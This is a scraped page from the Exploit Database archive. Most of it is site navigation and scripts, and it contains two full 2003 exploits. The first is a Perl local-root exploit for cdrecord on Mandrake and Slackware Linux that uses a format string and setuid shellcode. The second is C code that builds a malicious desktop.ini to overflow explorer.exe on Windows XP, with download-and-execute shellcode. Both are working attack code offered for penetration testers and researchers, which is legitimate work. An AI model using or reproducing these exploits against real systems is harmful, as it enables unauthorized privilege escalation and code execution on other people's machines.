TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 31
CDRTools CDRecord 2.0 (Mandrake / Slackware) - Local Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDCDRTools CDRecord 2.0 (Mandrake / Slackware) - Local Privilege EscalationEDB-ID:31CVE:2003-0289EDB Verified:Author:anonymousType:localExploit:/Platform:LinuxDate:2003-05-14Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl############################################################ Cdrecord version 2.0 and < local root exploit.###   [wsxz@localhost buffer]$ perl priv8cdr.pl 4#   Using target number 4#   Using Mr .dtors 0x808c82c#   Cdrecord 2.0 (i586-mandrake-linux-gnu)##   scsibus: -1 target: -1 lun: -1#   Warning: Open by 'devname' is unintentional and not supported.#   /usr/bin/cdrecord: No such file or directory. Cannot open '. Cannot open SCSI driver.#   /usr/bin/cdrecord: For possible targets try 'cdrecord -scanbus'. Make sure you are root.#   /usr/bin/cdrecord: For possible transport specifiers try 'cdrecord dev=help'.#   sh-2.05b# id#   uid=0(root) gid=0(root) groups=503(wsxz)#   sh-2.05b######################################################$shellcode ="\x31\xc0\x31\xdb\xb0\x17\xcd\x80".#setuid 0"\x31\xdb\x89\xd8\xb0\x2e\xcd\x80".#setgid 0"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89"."\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"."\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff"."\xff\xff/bin/sh";$cdrecordpath = "/usr/bin/cdrecord";$nop = "\x90"; # x86 NOP$offset = 0; # Default offset to try.if (@ARGV == 1 || @ARGV == 2) {$target = $ARGV[0];$offset = $ARGV[1];}else{printf(" Priv8security.com Cdrecord local root exploit!!\n");printf(" usage: $0 target\n");printf(" List of targets:\n");printf("      1 - Linux Mandrake 8.2 Cdrecord 1.11a15\n");printf("      2 - Linux Mandrake 9.0 Cdrecord 1.11a32\n");printf("      3 - Linux Slackware 8.1 Cdrecord 1.11a24 not suid by default!!!\n");printf("      4 - Linux Mandrake 9.1 Cdrecord 2.0\n");exit(1);}if ( $target eq "1" ) {$retword = 0x0807af38; #Mr  .dtors ;)$fmtstring = "%.134727238x%x%x%x%x%x%x%x%x%n:";}if ( $target eq "2" ) {# $retword = 0x08084578; #.dtors$retword = 0x08084684; #.GOT exit$fmtstring = "%.134769064x%x%x%x%x%x%x%x%x%n:";}if ( $target eq "3" ) {$retword = 0x0807f658;$fmtstring =  "%.134745456x%x%x%x%x%x%x%x%x%x%x%n:";}if ( $target eq "4" ) {$retword = 0x0808c82c; #.GOT exit$fmtstring = "%.134802669x%x%x%x%x%x%x%x%x%n:";}printf("Using target number %d\n", $target);printf("Using Mr .dtors 0x%x\n",$retword);$new_retword = pack('l', ($retword));$new_retshell = pack('l', ($retshell));$buffer2 = $new_retword;$buffer2 .= $nop x 150;$buffer2 .= $shellcode;$buffer2 .= $fmtstring;exec("$cdrecordpath dev='$buffer2' '$cdrecordpath'");# milw0rm.com [2003-05-14]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 32
Microsoft Windows XP - 'explorer.exe' Local Buffer Overflow - Windows local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows XP - 'explorer.exe' Local Buffer OverflowEDB-ID:32CVE:2003-0306EDB Verified:Author:einsteinType:localExploit:/Platform:WindowsDate:2003-05-21Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#include <fstream.h>#include <string.h>#include <stdio.h>#include <windows.h>#include <direct.h>char shellcode[]=//download url and exec shellcode//doesn't have any hardcoded values//except the base address of the program//searches the import table for//LoadLibraryA, GetProcAddress and ExitProcess.//by .einstein., dH team."\x81\xec\x40\x1f\x00\x00\xe8\x00\x00\x00\x00\x5d\x83\xed\x0b\xbf\x61\x57""\x7a\x74\xe8\x8c\x00\x00\x00\x89\xbd\x17\x01\x00\x00\xbf\x65\x1d\x22\x74""\xe8\x7c\x00\x00\x00\x89\xbd\x1b\x01\x00\x00\xbf\x17\x75\x79\x70\xe8\x6c""\x00\x00\x00\x89\xbd\x1f\x01\x00\x00\x8d\x85\x2c\x01\x00\x00\x50\x2e\xff""\x95\x17\x01\x00\x00\x8d\x9d\x33\x01\x00\x00\x53\x50\x2e\xff\x95\x1b\x01""\x00\x00\x6a\x00\x6a\x00\x8d\x8d\x4e\x01\x00\x00\x51\x8d\x8d\x5c\x01\x00""\x00\x51\x6a\x00\xff\xd0\x8d\x85\x23\x01\x00\x00\x50\x2e\xff\x95\x17\x01""\x00\x00\x8d\x9d\x46\x01\x00\x00\x53\x50\x2e\x8b\x9d\x1b\x01\x00\x00\xff""\xd3\x6a\x01\x8d\x8d\x4e\x01\x00\x00\x51\xff\xd0\x6a\x00\x2e\xff\x95\x1f""\x01\x00\x00\xbb\x3c\x00\x00\x01\x8b\x0b\x81\xc1\x04\x00\x00\x01\x8d\x41""\x14\x8b\x70\x68\x81\xc6\x00\x00\x00\x01\x8b\x06\x83\xf8\x00\x74\x51\x05""\x00\x00\x00\x01\x8b\x56\x10\x81\xc2\x00\x00\x00\x01\x8b\x18\x8b\xcb\x81""\xe1\x00\x00\x00\x80\x83\xf9\x00\x75\x2a\x81\xc3\x00\x00\x00\x01\x83\xc3""\x02\x33\xc9\x32\x0b\xc1\xc1\x08\x43\x80\x3b\x00\x75\xf5\x3b\xcf\x75\x04""\x8b\x3a\xeb\x16\x83\xc2\x04\x83\xc0\x04\x66\x83\x38\x00\x75\xc7\x83\xc6""\x14\x8b\x10\x83\xfa\x00\x74\xa8\xc3\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x4b\x45\x52\x4e\x45\x4c\x33\x32\x00\x55\x52\x4c\x4d\x4f\x4e""\x00\x55\x52\x4c\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x54\x6f\x46\x69\x6c\x65""\x41\x00\x57\x69\x6e\x45\x78\x65\x63\x00\x5c\x7e\x57\x52\x46\x35\x36\x33""\x34\x2e\x74\x6d\x70\x00";char unicode_header[] = "\xFF\xFE";char shell_header[] = "[.ShellClassInfo]\x0d\x0a";#define OVERFLOW_LEN 0xA1Cvoid main(){char url[]="file://c:/winnt/system32/calc.exe";// char url[]="http://localhost/cmd.exe";char eip[] = "\xcc\x59\xfb\x77"; //0x77fb59cc - WinXP SP1 ntdll.dll (jmp esp)char path[500];strcpy(path,"domain HELL team");mkdir(path);SetFileAttributes(path,FILE_ATTRIBUTE_READONLY);strcat(path,"\\desktop.ini");ofstream out(path,ios::out+ios::binary);out.write(unicode_header,sizeof(unicode_header)-1);char zero = 0;for (int i=0;i<strlen(shell_header);i++){out.write(&shell_header[i],1);out.write(&zero,1);}char pad = 'B';for (i=0;i<OVERFLOW_LEN;i++) out.write(&pad,1);char ebp[] = "1234";out.write(ebp,4);char pad0 = 1;out.write(eip,4);char pad2 = 'C';for (i=0;i<12;i++) out.write(&pad,1);out.write(shellcode,sizeof(shellcode)-1);out.write(url,sizeof(url));int len = sizeof(shellcode)-1+sizeof(url);printf("shellcode+url: %d bytes\n",len);if (len%2 == 1){printf("it's odd, so add 1 extra byte");out.write(&pad2,1);}out.close();}// milw0rm.com [2003-05-21]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 33
